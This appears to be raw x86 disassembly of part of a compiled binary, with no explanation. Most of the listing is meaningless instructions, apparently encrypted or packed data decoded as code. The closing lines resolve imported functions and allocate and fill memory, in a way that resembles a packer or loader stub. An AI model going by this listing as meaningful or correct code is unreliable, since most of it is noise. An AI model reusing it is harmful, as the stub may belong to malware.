  414be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414be8:	int    0x15
  414bea:	scas   al,BYTE PTR es:[edi]
  414beb:	enter  0xdb4e,0x36
  414bef:	xchg   esi,eax
  414bf0:	call   0xfee6:0x753b5cbd
  414bf7:	or     dh,dl
  414bf9:	sti    
  414bfa:	jecxz  0x414c0a
  414bfc:	mov    esp,0xc2fea51
  414c01:	jo     0x414bd3
  414c03:	not    BYTE PTR [ebx+eiz*4]
  414c06:	mov    al,ds:0x9c7005cc
  414c0b:	test   al,0xca
  414c0d:	mov    al,0xa
  414c0f:	cmc    
  414c10:	adc    ah,al
  414c12:	xchg   ebx,eax
  414c13:	mov    al,ds:0x9c2c3df0
  414c18:	call   0xcdcdef6b
  414c1d:	call   0x88e5:0xcf1fbc72
  414c24:	cmp    al,0xe8
  414c26:	or     eax,DWORD PTR [esi]
  414c28:	add    bh,BYTE PTR [ebx+0x61]
  414c2b:	ins    DWORD PTR es:[edi],dx
  414c2c:	dec    ecx
  414c2d:	xlat   BYTE PTR ds:[ebx]
  414c2e:	mov    bl,0x71
  414c30:	push   ds
  414c31:	mov    dh,0x3f
  414c33:	mov    ds:0xb8dcc167,al
  414c38:	test   al,0x79
  414c3a:	pop    eax
  414c3b:	imul   eax,DWORD PTR [ecx-0x5678ed55],0x37
  414c42:	jnp    0x414c53
  414c44:	pop    esi
  414c45:	pop    esi
  414c46:	aas    
  414c47:	dec    ebx
  414c48:	jbe    0x414c55
  414c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4b:	test   al,0x7
  414c4d:	jg     0x414c81
  414c4f:	mov    ah,0x65
  414c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c52:	fs jg  0x414c00
  414c55:	add    BYTE PTR [ebp+0x44453450],ch
  414c5b:	pop    ecx
  414c5c:	lahf   
  414c5d:	push   ds
  414c5e:	jae    0x414cd9
  414c60:	and    dl,BYTE PTR [ebx+0x278fedbc]
  414c66:	inc    ecx
  414c67:	data16 adc al,0x72
  414c6a:	nop
  414c6b:	cmp    eax,0xba81a66
  414c70:	jno    0x414c73
  414c72:	cmp    dl,BYTE PTR [edi]
  414c74:	and    ecx,DWORD PTR ds:0x9463346c
  414c7a:	(bad)  
  414c7b:	aaa    
  414c7c:	xor    eax,0x4ff18274
  414c81:	jl     0x414ce2
  414c83:	push   ebp
  414c84:	stos   DWORD PTR es:[edi],eax
  414c85:	pusha  
  414c86:	adc    al,0x7b
  414c88:	mov    eax,0x9db785a4
  414c8d:	adc    eax,0xcd7afc5f
  414c92:	adc    edi,DWORD PTR [eax+esi*1-0x3086c75d]
  414c99:	jne    0x414cd1
  414c9b:	adc    BYTE PTR [ecx+0x63],ch
  414c9e:	ins    DWORD PTR es:[edi],dx
  414c9f:	ja     0x414c55
  414ca1:	sbb    DWORD PTR [ebx+0xdbf8ac4],ebx
  414ca7:	shr    BYTE PTR ds:0x34980455,1
  414cad:	mov    eax,ds:0xa12a46fd
  414cb2:	jmp    0x414c7c
  414cb4:	mov    edx,0xf5076d95
  414cb9:	or     ecx,ebp
  414cbb:	inc    ecx
  414cbc:	or     eax,esp
  414cbe:	js     0x414cc7
  414cc0:	inc    ecx
  414cc1:	ss retf 0xc559
  414cc5:	stos   BYTE PTR es:[edi],al
  414cc6:	stc    
  414cc7:	addr16 shr bl,cl
  414cca:	loope  0x414d1b
  414ccc:	adc    al,0x2f
  414cce:	mov    DWORD PTR [eax+0x23],ebp
  414cd1:	jbe    0x414c61
  414cd3:	(bad)  
  414cd4:	idiv   BYTE PTR [ebp+0x253bd682]
  414cda:	push   ecx
  414cdb:	push   ss
  414cdc:	fs mov eax,0x49b25292
  414ce2:	xor    DWORD PTR [ebx],0x9bbe8ec0
  414ce8:	pop    esp
  414ce9:	adc    DWORD PTR [ebp+edi*4+0x35],eax
  414ced:	push   ss
  414cee:	jmp    0x3b725346
  414cf3:	lahf   
  414cf4:	cmp    DWORD PTR [eax+0x65de349b],eax
  414cfa:	cmp    ecx,ebp
  414cfc:	les    edi,FWORD PTR [ecx-0x77c99715]
  414d02:	sbb    al,0x1d
  414d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d05:	jle    0x414ce0
  414d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d08:	cld    
  414d09:	add    DWORD PTR [esi],edi
  414d0b:	sahf   
  414d0c:	adc    cl,ah
  414d0e:	push   edi
  414d0f:	push   0x57260dc
  414d14:	sbb    BYTE PTR [ebx],0xa1
  414d17:	mov    ebp,0x4e5430f5
  414d1c:	stos   BYTE PTR es:[edi],al
  414d1d:	dec    edx
  414d1e:	cdq    
  414d1f:	sub    BYTE PTR [ebp+0x75],0xc1
  414d23:	repnz push edx
  414d25:	pop    esp
  414d26:	aaa    
  414d27:	or     BYTE PTR [edi-0x5d47339a],dh
  414d2d:	push   0x11
  414d2f:	xchg   BYTE PTR ds:0xf6242f4f,bh
  414d35:	xchg   ebp,eax
  414d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d38:	js     0x414cf7
  414d3a:	xchg   ebx,eax
  414d3b:	mov    ecx,0x6dc64e4f
  414d40:	scas   eax,DWORD PTR es:[edi]
  414d41:	cdq    
  414d42:	dec    eax
  414d43:	mov    esi,0xec2f5e6f
  414d48:	jg     0x414dbc
  414d4a:	stc    
  414d4b:	or     al,BYTE PTR [esi-0x15]
  414d4e:	inc    eax
  414d4f:	inc    edx
  414d50:	pop    eax
  414d51:	ins    DWORD PTR es:[edi],dx
  414d52:	push   edi
  414d53:	fs mov edi,0x41bf2000
  414d59:	loope  0x414db2
  414d5b:	push   eax
  414d5c:	mov    al,0x7
  414d5e:	loop   0x414d24
  414d60:	sar    DWORD PTR [ebx-0x2c],1
  414d63:	cmc    
  414d64:	lea    esp,[edi]
  414d66:	inc    edi
  414d67:	adc    al,BYTE PTR [ecx+0x1709ac51]
  414d6d:	stos   DWORD PTR es:[edi],eax
  414d6e:	pop    esi
  414d6f:	add    DWORD PTR [esi-0x75],ecx
  414d72:	sub    al,0xa9
  414d74:	mov    al,ds:0x9f373148
  414d79:	inc    eax
  414d7a:	(bad)  
  414d7b:	adc    eax,0x837a4335
  414d80:	xchg   esp,eax
  414d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d82:	ss dec esp
  414d84:	jmp    0xce1d3df5
  414d89:	(bad)  
  414d8a:	repnz jmp 0xec6e:0x4bc7fe3c
  414d92:	sahf   
  414d93:	pop    ebp
  414d94:	or     al,BYTE PTR [esi]
  414d96:	jmp    0x6575:0x5f580086
  414d9d:	test   eax,0xbb31bd03
  414da2:	or     ebx,0x650173c
  414da8:	inc    edx
  414da9:	push   eax
  414daa:	mov    cl,0x99
  414dac:	fadd   QWORD PTR [ebx]
  414dae:	pushf  
  414daf:	mov    BYTE PTR [edi-0x78cf0d3a],ch
  414db5:	sub    BYTE PTR [esi-0x19],bl
  414db8:	sbb    DWORD PTR [edi+edx*1],eax
  414dbb:	inc    ebx
  414dbc:	inc    ebp
  414dbd:	mov    BYTE PTR [esi+0x4052ed3c],ch
  414dc3:	mov    ch,0x45
  414dc5:	aaa    
  414dc6:	fnstcw WORD PTR [ebp+0x31c3f990]
  414dcc:	push   ecx
  414dcd:	or     BYTE PTR [ebp+0x1f],ah
  414dd0:	jp     0x414d99
  414dd2:	or     DWORD PTR [ebx-0x7c],ebx
  414dd5:	dec    ebx
  414dd6:	ss push esp
  414dd8:	inc    esp
  414dd9:	dec    esi
  414dda:	dec    edx
  414ddb:	mov    esi,DWORD PTR [ebx+0x1b3fb50]
  414de1:	push   0x3be4bfe4
  414de6:	lods   eax,DWORD PTR ds:[esi]
  414de7:	call   0x715e:0xb99b9a9d
  414dee:	push   ecx
  414def:	add    al,0x1
  414df1:	test   DWORD PTR [ecx],ebx
  414df3:	push   edi
  414df4:	jecxz  0x414dd2
  414df6:	jae    0x414e5f
  414df8:	or     ecx,0xffffffc4
  414dfb:	rol    DWORD PTR [ebp-0x1a26ed85],cl
  414e01:	aaa    
  414e02:	cdq    
  414e03:	and    edi,DWORD PTR [ecx]
  414e05:	ror    ebx,1
  414e07:	hlt    
  414e08:	pop    ebx
  414e09:	and    al,0x53
  414e0b:	ror    ah,0x7
  414e0e:	aam    0xcc
  414e10:	inc    edi
  414e11:	idiv   BYTE PTR [edx+0x65b3a2be]
  414e17:	ret    
  414e18:	mov    bh,0x94
  414e1a:	pop    ebp
  414e1b:	cmp    BYTE PTR [eax],cl
  414e1d:	test   BYTE PTR [esi],cl
  414e1f:	sbb    BYTE PTR [eax+0x73d6c467],al
  414e25:	sbb    eax,0x1b5bc5af
  414e2a:	call   0x5261:0x6397dc37
  414e31:	cld    
  414e32:	push   esi
  414e33:	int3   
  414e34:	clc    
  414e35:	inc    esi
  414e36:	dec    ebx
  414e37:	adc    esi,edi
  414e39:	xlat   BYTE PTR ds:[ebx]
  414e3a:	push   edx
  414e3b:	push   ss
  414e3c:	and    DWORD PTR [esi],ebx
  414e3e:	sahf   
  414e3f:	in     al,dx
  414e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e42:	hlt    
  414e43:	xor    DWORD PTR [ecx+eiz*2+0x17],edx
  414e47:	pause  
  414e49:	outs   dx,DWORD PTR ds:[esi]
  414e4a:	or     ebx,DWORD PTR [edx-0x61]
  414e4d:	es xchg ebp,eax
  414e4f:	cmp    dl,BYTE PTR [ecx]
  414e51:	outs   dx,DWORD PTR ds:[esi]
  414e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e53:	in     eax,dx
  414e54:	fadd   QWORD PTR [esi]
  414e56:	push   ebp
  414e57:	inc    ebx
  414e58:	lahf   
  414e59:	fstp   TBYTE PTR [edx+0x7336b1a]
  414e5f:	mov    edi,0x847b37d0
  414e64:	shr    eax,cl
  414e66:	jge    0x414e6f
  414e68:	rol    BYTE PTR [esi+0x6a46304b],1
  414e6e:	add    BYTE PTR [esi-0x1b],dl
  414e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e72:	add    BYTE PTR [edx],ah
  414e74:	jg     0x6df8bf63
  414e7a:	les    ebx,FWORD PTR [edx]
  414e7c:	lahf   
  414e7d:	adc    ebx,ecx
  414e7f:	jne    0x414eb7
  414e81:	retf   0x19ea
  414e84:	xchg   edx,eax
  414e85:	test   BYTE PTR [ebx+0x30],dh
  414e88:	push   ebp
  414e89:	xor    al,0xd9
  414e8b:	ja     0x414e4a
  414e8d:	ds lock pop ebp
  414e90:	fsub   st(3),st
  414e92:	xchg   ecx,eax
  414e93:	mov    ebx,0x7cd29dc6
  414e98:	fmul   DWORD PTR [eax-0x7b]
  414e9b:	push   ebx
  414e9c:	dec    ecx
  414e9d:	repz adc DWORD PTR [ecx-0x57],edi
  414ea1:	popa   
  414ea2:	scas   eax,DWORD PTR es:[edi]
  414ea3:	repz xchg edx,eax
  414ea5:	retf   
  414ea6:	fdivr  st(5),st
  414ea8:	dec    ebp
  414ea9:	int    0x8b
  414eab:	jg     0x414e92
  414ead:	pop    es
  414eae:	ss add dh,cl
  414eb1:	mov    dh,0xfb
  414eb3:	pop    es
  414eb4:	sti    
  414eb5:	js     0x414e5d
  414eb7:	out    0xbd,eax
  414eb9:	cmc    
  414eba:	or     ebp,edx
  414ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebd:	xchg   ebp,eax
  414ebe:	mov    dh,BYTE PTR [ebx-0x397904ca]
  414ec4:	adc    eax,0x9635c042
  414ec9:	dec    esp
  414eca:	xchg   ecx,eax
  414ecb:	call   esi
  414ecd:	test   al,0x76
  414ecf:	pop    edx
  414ed0:	aad    0x28
  414ed2:	push   ecx
  414ed3:	sub    esp,edx
  414ed5:	pop    ecx
  414ed6:	in     eax,dx
  414ed7:	mov    esp,ebp
  414ed9:	sub    bl,BYTE PTR [edx-0x17]
  414edc:	fsincos 
  414ede:	outs   dx,DWORD PTR ds:[esi]
  414edf:	inc    ebp
  414ee0:	ins    BYTE PTR es:[edi],dx
  414ee1:	ins    DWORD PTR es:[edi],dx
  414ee2:	push   esi
  414ee3:	pop    ss
  414ee4:	or     BYTE PTR [ebx-0x5c],ah
  414ee7:	jmp    0x414ed4
  414ee9:	ja     0x414f4c
  414eeb:	clc    
  414eec:	dec    ecx
  414eed:	lea    esp,[edi-0x3f]
  414ef0:	aad    0x63
  414ef2:	fdiv   QWORD PTR [esi]
  414ef4:	enter  0x852d,0x8e
  414ef8:	xchg   esi,eax
  414ef9:	cmp    DWORD PTR [edx-0x296856f],0xffffffac
  414f00:	pop    ebx
  414f01:	lds    eax,FWORD PTR [eax]
  414f03:	arpl   WORD PTR [ebp+ecx*2-0x3f922a9b],cx
  414f0a:	dec    esi
  414f0b:	or     ah,dl
  414f0d:	mov    edi,0x16ed797e
  414f12:	inc    ebx
  414f13:	mov    bl,0x2d
  414f15:	cpuid  
  414f17:	add    al,0xaa
  414f19:	xor    BYTE PTR [esi-0x42],ah
  414f1c:	cmp    ch,dl
  414f1e:	neg    DWORD PTR [ebx+0xc014719]
  414f24:	add    eax,0xea4b39ed
  414f29:	push   ds
  414f2a:	push   0x74
  414f2c:	fmul   DWORD PTR [edi-0x617da310]
  414f32:	xor    DWORD PTR [edx+0x7e],edx
  414f35:	cmp    al,0xa1
  414f37:	loopne 0x414eb9
  414f39:	add    esp,edx
  414f3b:	xor    dl,dh
  414f3d:	inc    DWORD PTR [esi-0x490d69b0]
  414f43:	push   ebp
  414f44:	(bad)  
  414f45:	and    BYTE PTR [esi+0x32],bl
  414f48:	sub    ebp,ebx
  414f4a:	jae    0x414f4d
  414f4c:	push   0xd5b0108f
  414f51:	fst    st(1)
  414f53:	pop    ss
  414f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f55:	adc    al,0xa2
  414f57:	(bad)  
  414f58:	cmp    ch,ah
  414f5a:	sub    BYTE PTR [esi+ebp*8+0x637da50b],ah
  414f61:	rol    dl,0x36
  414f64:	mov    ch,0x23
  414f66:	and    BYTE PTR [esi],0xe7
  414f69:	in     eax,dx
  414f6a:	in     al,0x15
  414f6c:	sbb    eax,0x8f4598e4
  414f71:	ds pop edx
  414f73:	in     al,0xaf
  414f75:	retf   
  414f76:	sti    
  414f77:	call   0x7269:0x4c4ceef3
  414f7e:	cmp    DWORD PTR [ebx-0x3e],esi
  414f81:	es ds int 0xec
  414f85:	cmp    BYTE PTR [edi+0x5eb68ab7],al
  414f8b:	dec    edx
  414f8c:	iret   
  414f8d:	in     eax,0xe5
  414f8f:	xor    al,BYTE PTR [eax-0x5b041345]
  414f95:	ret    
  414f96:	mov    edi,0x3f8f2a66
  414f9b:	jp     0x414fcb
  414f9d:	inc    esp
  414f9e:	adc    DWORD PTR [eax-0x16ccf47d],0xffffffb0
  414fa5:	pop    DWORD PTR [eax]
  414fa7:	stos   BYTE PTR es:[edi],al
  414fa8:	or     DWORD PTR [edx+0x60639fac],0xffffffb2
  414faf:	push   ecx
  414fb0:	inc    edx
  414fb1:	xchg   edx,eax
  414fb2:	mov    eax,0xf4a67d74
  414fb7:	idiv   DWORD PTR [ebx+0x4c117db4]
  414fbd:	stos   DWORD PTR es:[edi],eax
  414fbe:	mov    ds:0xa1419abd,al
  414fc3:	out    0xab,al
  414fc5:	sbb    al,0xb4
  414fc7:	sub    eax,0x270718a9
  414fcc:	icebp  
  414fcd:	push   ebp
  414fce:	in     eax,0x7c
  414fd0:	push   eax
  414fd1:	daa    
  414fd2:	stc    
  414fd3:	sub    dl,bl
  414fd5:	sbb    edi,DWORD PTR [eax]
  414fd7:	out    dx,al
  414fd8:	adc    al,0x38
  414fda:	or     al,0xa3
  414fdc:	loop   0x415026
  414fde:	pop    eax
  414fdf:	push   esi
  414fe0:	xchg   edi,eax
  414fe1:	push   edi
  414fe2:	xchg   ebx,ebp
  414fe4:	jge    0x414f79
  414fe6:	imul   esi,DWORD PTR [esi-0x3d1c3a69],0x7a
  414fed:	addr16 push esp
  414fef:	and    DWORD PTR [edi+0x3b946d3e],eax
  414ff5:	push   ds
  414ff6:	jmp    DWORD PTR [eax+0x83a5b1c]
  414ffc:	ds stos DWORD PTR es:[edi],eax
  414ffe:	cmp    eax,0x542bfcad
  415003:	mov    bh,BYTE PTR [ecx-0x7f]
  415006:	inc    ecx
  415007:	cld    
  415008:	xor    DWORD PTR [ebx],0x9f1ab43
  41500e:	movntq QWORD PTR [edx+0x4f890ed2],mm4
  415015:	push   cs
  415016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415017:	cwde   
  415018:	mov    ebx,0xf7b23766
  41501d:	mov    ecx,0x57cbc44f
  415022:	gs inc edx
  415024:	popa   
  415025:	mov    ah,0x7f
  415027:	rcr    eax,cl
  415029:	pop    ebp
  41502a:	jno    0x415043
  41502c:	jmp    0x4a3e:0x32b2602b
  415033:	and    BYTE PTR [edx],dh
  415035:	cwde   
  415036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415037:	aam    0xee
  415039:	idiv   al
  41503b:	mov    dl,0x8d
  41503d:	push   ebx
  41503e:	es and al,0x30
  415041:	cmp    eax,DWORD PTR [edi+0x7302d7b9]
  415047:	xchg   ecx,eax
  415048:	jecxz  0x415092
  41504a:	stos   BYTE PTR es:[edi],al
  41504b:	int3   
  41504c:	push   cs
  41504d:	mov    dh,0x52
  41504f:	sbb    bh,BYTE PTR [eax+0x6f]
  415052:	xor    dh,BYTE PTR [esp+ecx*1]
  415055:	lock push ss
  415057:	jns    0x415092
  415059:	add    al,0x7b
  41505b:	jg     0x4150c6
  41505d:	icebp  
  41505e:	push   cs
  41505f:	mov    ah,0xc
  415061:	pusha  
  415062:	leave  
  415063:	sub    al,BYTE PTR [eax]
  415065:	mov    ch,0x8f
  415067:	call   0xf243:0x3e1c53f5
  41506e:	push   0xc1594cf5
  415073:	xchg   ecx,esp
  415075:	sub    ecx,DWORD PTR [ebp+0x11f30f67]
  41507b:	xor    al,0xf7
  41507d:	popa   
  41507e:	sahf   
  41507f:	pop    es
  415080:	into   
  415081:	jge    0x415031
  415083:	push   esi
  415084:	xchg   esi,ecx
  415086:	adc    eax,0x401106ab
  41508b:	aam    0xf4
  41508d:	jmp    ebx
  41508f:	mov    ebx,0x6b81cf44
  415094:	ffree  st(7)
  415096:	pop    ss
  415097:	out    dx,al
  415098:	das    
  415099:	call   0x2b9fbf64
  41509e:	(bad)  
  41509f:	test   eax,0xf211fddc
  4150a4:	pop    edi
  4150a5:	add    eax,0x2985e17d
  4150aa:	je     0x41504c
  4150ac:	xor    DWORD PTR [edi+0x33],esi
  4150af:	fwait
  4150b0:	cmp    ebp,DWORD PTR [esi]
  4150b2:	xlat   BYTE PTR ds:[ebx]
  4150b3:	(bad)  
  4150b5:	scas   eax,DWORD PTR es:[edi]
  4150b6:	imul   BYTE PTR [ecx]
  4150b8:	push   edi
  4150b9:	pop    ecx
  4150ba:	dec    edx
  4150bb:	sub    al,0xde
  4150bd:	pop    edx
  4150be:	loopne 0x415059
  4150c0:	les    esp,FWORD PTR [ebx]
  4150c2:	push   eax
  4150c3:	test   al,0x86
  4150c5:	idiv   BYTE PTR [edi+0x23]
  4150c8:	(bad)  
  4150c9:	fistp  DWORD PTR [edi-0x4c]
  4150cc:	hlt    
  4150cd:	sbb    BYTE PTR [edi],ah
  4150cf:	xchg   esi,eax
  4150d0:	fisubr WORD PTR ds:0xaf8520dd
  4150d6:	pop    eax
  4150d7:	daa    
  4150d8:	xchg   edx,eax
  4150d9:	call   0xe8786510
  4150de:	dec    ebx
  4150df:	pop    es
  4150e0:	xchg   ebx,eax
  4150e1:	push   ds
  4150e2:	xchg   ecx,eax
  4150e3:	jns    0x415135
  4150e5:	data16 fs xor al,0xf3
  4150e9:	into   
  4150ea:	or     al,ch
  4150ec:	sahf   
  4150ed:	cmp    ebp,esp
  4150ef:	mov    esi,0x88a4c831
  4150f4:	(bad)  
  4150f5:	push   edx
  4150f6:	jmp    0x1216:0x6cb55b9e
  4150fd:	push   eax
  4150fe:	xchg   esi,eax
  4150ff:	ja     0x4150f3
  415101:	or     esi,DWORD PTR [eax+edi*1]
  415104:	or     eax,0x55f34020
  415109:	xchg   edx,eax
  41510a:	jnp    0x4150d8
  41510c:	mov    esi,0x4f17a9bc
  415111:	or     BYTE PTR [eax],al
  415113:	mov    bh,0xe4
  415115:	jne    0x4150ee
  415117:	push   esi
  415118:	push   esp
  415119:	mov    dh,0x3d
  41511b:	jne    0x41513e
  41511d:	mov    eax,0x8445809c
  415122:	test   eax,0x5c5b1605
  415127:	sub    eax,0x54ec56d8
  41512c:	call   0xeb8d:0x41274457
  415133:	ret    
  415134:	mov    ch,0xaf
  415136:	pop    edi
  415137:	ss push edx
  415139:	hlt    
  41513a:	jmp    0x6a055dd7
  41513f:	retf   
  415140:	cli    
  415141:	in     al,dx
  415142:	jecxz  0x415171
  415144:	mov    dh,0x79
  415146:	lods   eax,DWORD PTR ds:[esi]
  415147:	js     0x41512e
  415149:	ins    DWORD PTR es:[edi],dx
  41514a:	stos   DWORD PTR es:[edi],eax
  41514b:	daa    
  41514c:	inc    ebx
  41514d:	xchg   esp,eax
  41514e:	mov    bl,BYTE PTR [esi+eiz*4]
  415151:	cmc    
  415152:	adc    al,0xff
  415154:	pop    ss
  415155:	xchg   esi,eax
  415156:	pop    ebx
  415157:	mov    esp,0x7be83788
  41515c:	or     al,0x81
  41515e:	fdivp  st(1),st
  415160:	retf   0x3d7f
  415163:	pop    ss
  415164:	fcom   DWORD PTR cs:[bx+si-0x267d]
  41516a:	imul   ecx,DWORD PTR [ebx+edi*2+0x2d6aa1af],0x40
  415172:	rcl    esp,cl
  415174:	jns    0x41517d
  415176:	pop    esp
  415177:	cmc    
  415178:	dec    esi
  415179:	and    al,0xde
  41517b:	push   ds
  41517c:	sub    eax,0x894baeb0
  415181:	mul    ebp
  415183:	aaa    
  415184:	jb     0x4151de
  415186:	inc    eax
  415187:	mov    dl,0x60
  415189:	pop    edi
  41518a:	jp     0x4151ed
  41518c:	or     DWORD PTR [edx*2+0x7692a551],ebp
  415193:	push   ss
  415194:	sub    ah,BYTE PTR [esi+0x4e]
  415197:	push   eax
  415198:	push   ecx
  415199:	sub    BYTE PTR [eax+0x0],bh
  41519c:	jp     0x4151f3
  41519e:	xchg   ecx,eax
  41519f:	and    dl,BYTE PTR [ebx]
  4151a1:	mov    ch,0x64
  4151a3:	push   ds
  4151a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a5:	pushf  
  4151a6:	adc    BYTE PTR [esi],bl
  4151a8:	pop    esi
  4151a9:	or     ecx,edx
  4151ab:	mov    WORD PTR [esi+0x1],?
  4151ae:	(bad)  
  4151af:	repnz or DWORD PTR ds:0x7d30564f,ebx
  4151b6:	push   eax
  4151b7:	enter  0x352,0x78
  4151bb:	or     al,0xe4
  4151bd:	pop    edx
  4151be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151bf:	sbb    BYTE PTR [edi],0x5b
  4151c2:	shr    ah,0x3b
  4151c5:	adc    DWORD PTR [ebp+0x37],ecx
  4151c8:	imul   esp,esi,0xf
  4151cb:	jbe    0x41522f
  4151cd:	enter  0x7bbe,0x3b
  4151d1:	sub    eax,edx
  4151d3:	inc    ebp
  4151d4:	dec    ebp
  4151d5:	mov    ds:0xebf7aef4,eax
  4151da:	push   ecx
  4151db:	jl     0x41521c
  4151dd:	add    al,0x52
  4151df:	lods   eax,DWORD PTR ds:[esi]
  4151e0:	push   esi
  4151e1:	cld    
  4151e2:	dec    ebx
  4151e3:	call   0x549a:0x30677817
  4151ea:	fnstcw WORD PTR [edi+0x175a1cfd]
  4151f0:	inc    edx
  4151f1:	xchg   ecx,eax
  4151f2:	mov    cl,0xf1
  4151f4:	cmp    ebx,DWORD PTR [edi+ecx*2+0x18ae8b6e]
  4151fb:	(bad)  
  4151fc:	lods   eax,DWORD PTR ds:[esi]
  4151fd:	dec    eax
  4151fe:	fcomp  DWORD PTR [esi]
  415200:	fist   WORD PTR [esi+0x46]
  415203:	xor    ebp,0x5e82d8f2
  415209:	jne    0x41520e
  41520b:	and    DWORD PTR [esi-0xceb365c],edi
  415211:	mov    al,ds:0xb37e844c
  415216:	sbb    BYTE PTR [edi-0x5a],bl
  415219:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41521b:	int3   
  41521c:	test   BYTE PTR [esi+ecx*8+0x410cd6d3],ah
  415223:	dec    edx
  415224:	fld    TBYTE PTR [ecx]
  415226:	test   al,0x8
  415228:	sar    BYTE PTR gs:[ebx],cl
  41522b:	shl    DWORD PTR [ebp-0x79],0x11
  41522f:	test   ah,dl
  415231:	dec    edi
  415232:	mov    DWORD PTR [esi+0x22],ebp
  415235:	pop    eax
  415236:	push   ebp
  415237:	imul   DWORD PTR [edi]
  415239:	add    ebp,DWORD PTR [eax-0x2a]
  41523c:	xor    ebx,esp
  41523e:	xchg   edx,eax
  41523f:	pop    ds
  415240:	jae    0x415236
  415242:	repz mov al,0x6e
  415245:	add    DWORD PTR [ebp+eiz*1-0x5a],0xb3f21ae6
  41524d:	or     eax,0xc5218e52
  415252:	nop
  415253:	outs   dx,DWORD PTR ds:[esi]
  415254:	push   edx
  415255:	mov    WORD PTR [di+0x70],?
  415259:	enter  0xf953,0x0
  41525d:	cmc    
  41525e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525f:	inc    edi
  415260:	sub    al,0x40
  415262:	fist   DWORD PTR [esi+edi*4-0x67a99a11]
  415269:	jbe    0x4151eb
  41526b:	cs popf 
  41526d:	in     eax,0x61
  41526f:	inc    esi
  415270:	out    dx,eax
  415271:	jnp    0x415286
  415273:	dec    edx
  415274:	jge    0x4151f8
  415276:	call   0xbebd:0x23c888ad
  41527d:	inc    ecx
  41527e:	mov    esp,0xa5780ab2
  415283:	bound  edx,QWORD PTR [ebp+0x6752a6de]
  415289:	mov    cl,0x24
  41528b:	adc    dl,BYTE PTR [ebx+eiz*2]
  41528e:	sbb    BYTE PTR ds:0x2458cf0,bh
  415294:	pop    es
  415295:	sbb    BYTE PTR [ebx+0x4a2295e4],0x2b
  41529c:	shr    DWORD PTR [edi+eax*4+0x2232dc4f],0x56
  4152a4:	mov    cs,esi
  4152a6:	mov    esi,DWORD PTR [ebx-0x25]
  4152a9:	(bad)  
  4152ab:	(bad)  [eax]
  4152ad:	xor    ecx,DWORD PTR [ebp-0x13]
  4152b0:	dec    esi
  4152b1:	sub    al,0x6f
  4152b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152b4:	int3   
  4152b5:	inc    ebp
  4152b6:	xor    ebp,edx
  4152b8:	ret    
  4152b9:	rcr    DWORD PTR [ecx-0x77],cl
  4152bc:	dec    esp
  4152bd:	cmp    DWORD PTR ds:0x606c4a4e,0x53104c97
  4152c7:	test   DWORD PTR [edx],0x2644e898
  4152cd:	mov    eax,ds:0x1384ff5c
  4152d2:	dec    ecx
  4152d3:	lods   al,BYTE PTR ds:[esi]
  4152d4:	daa    
  4152d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152d6:	call   DWORD PTR ds:0x417014
  4152dc:	mov    DWORD PTR [ebp-0x2c],eax
  4152df:	movzx  eax,WORD PTR [ebp-0x2c]
  4152e3:	cmp    eax,0x539
  4152e8:	jne    0x415319
  4152ea:	mov    DWORD PTR [ebp-0x14],0xe0d
  4152f1:	lea    ecx,[ebp-0x28]
  4152f4:	push   ecx
  4152f5:	call   DWORD PTR ds:0x417018
  4152fb:	mov    DWORD PTR [ebp-0x60],eax
  4152fe:	mov    DWORD PTR [ebp-0x54],0x3a
  415305:	mov    BYTE PTR [ebp-0x34],0x0
  415309:	mov    DWORD PTR [ebp-0x8],0xe1da2d27
  415310:	mov    DWORD PTR [ebp-0x68],0x122d67
  415317:	jmp    0x41532e
  415319:	mov    BYTE PTR ds:0x417038,0x0
  415320:	push   0x42cfc8
  415325:	call   DWORD PTR ds:0x417018
  41532b:	mov    DWORD PTR [ebp-0x2c],eax
  41532e:	push   0x0
  415330:	call   DWORD PTR ds:0x417018
  415336:	mov    DWORD PTR [ebp-0x2c],eax
  415339:	push   DWORD PTR ds:0x417018
  41533f:	pop    edx
  415340:	mov    DWORD PTR [ebp-0x6c],edx
  415343:	lea    edx,[ebp-0x40]
  415346:	push   edx
  415347:	mov    eax,DWORD PTR [ebp-0x60]
  41534a:	push   eax
  41534b:	call   DWORD PTR ds:0x417024
  415351:	mov    DWORD PTR [ebp-0x44],eax
  415354:	push   DWORD PTR [ebp-0x30]
  415357:	push   0x1000
  41535c:	mov    eax,DWORD PTR [ebp-0x14]
  41535f:	add    eax,0x23
  415362:	add    eax,0x23
  415365:	push   eax
  415366:	xor    eax,eax
  415368:	push   eax
  415369:	mov    ecx,DWORD PTR [ebp-0x44]
  41536c:	call   ecx
  41536e:	push   eax
  41536f:	pop    ecx
  415370:	mov    DWORD PTR [ebp-0x4],ecx
  415373:	mov    ecx,DWORD PTR [ebp-0x68]
  415376:	sub    ecx,0xdae0b
  41537c:	mov    DWORD PTR [ebp-0x68],ecx
  41537f:	cmp    DWORD PTR [ebp-0x4],0x0
  415383:	jne    0x41539d
  415385:	push   0x0
  415387:	push   0x0
  415389:	call   0x416a5c
  41538e:	push   0x0
  415390:	call   DWORD PTR ds:0x41702c
  415396:	mov    BYTE PTR ds:0x447f40,0x0
  41539d:	mov    edx,DWORD PTR [ebp-0x4]
  4153a0:	add    edx,DWORD PTR [ebp-0x14]
